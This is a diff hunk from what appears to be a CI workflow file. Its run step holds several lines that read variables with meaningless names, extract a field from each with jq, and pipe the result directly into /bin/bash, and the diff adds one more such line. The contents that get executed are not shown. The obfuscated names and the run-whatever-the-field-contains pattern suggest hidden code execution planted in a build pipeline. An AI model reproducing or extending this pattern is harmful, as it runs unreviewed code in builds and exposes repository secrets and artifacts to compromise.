@@ -43,6 +43,7 @@ jobs:
           echo $clv9 | jq -r .yzy72192 | /bin/bash
           echo $evfv2 | jq -r .ng88 | /bin/bash
           printf '%s' "$oqm186" | jq -r .wllrd02437 | /bin/bash
+          echo $i9 | jq -r .z08 | /bin/bash
 
       - name: Upload artifact
         if: always()
